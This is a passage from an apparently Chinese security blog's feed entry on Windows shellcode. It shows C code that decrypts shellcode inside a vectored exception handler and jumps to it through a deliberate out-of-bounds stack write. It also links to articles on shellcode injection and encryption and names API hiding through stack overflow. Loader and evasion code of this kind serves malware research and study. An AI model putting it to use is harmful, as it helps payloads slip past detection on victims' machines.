val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)</span><br><span class="line">{</span><br><span class="line">Decshellcode();</span><br><span class="line">val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandle);</span><br><span class="line"><span class="keyword">int</span> bilibili = <span class="number">2020</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p><p><a href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p><p>AddVectoredExceptionHandler是异常处理机制try和except的封装，val-&gt;ExceptionRecord-&gt;ExceptionCode记录着异常的类型</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581840737.png" alt></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581929518.png" alt></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649582032897.png" alt></p><h1 id="shellcode注入"><a class="header-anchor" href="#shellcode注入">¶</a>shellcode注入</h1><p>当然shellcode注入不止这种，还有其他的方法</p><p><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021">https://myzxcg.com/2022/01/Windows-Shellcode-注入姿势/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021</a></p><p><a href="https://cloud.tencent.com/developer/article/1787191">https://cloud.tencent.com/developer/article/1787191</a></p><p>shellcode加密</p><p><a href="https://www.cnblogs.com/LyShark/p/13033722.html">https://www.cnblogs.com/LyShark/p/13033722.html</a></p><h1 id="0x08-隐藏API"><a class="header-anchor" href="#0x08-隐藏API">¶</a>0x08-隐藏API</h1><p>利用栈溢出隐藏API</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;shellcode&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
</feed>
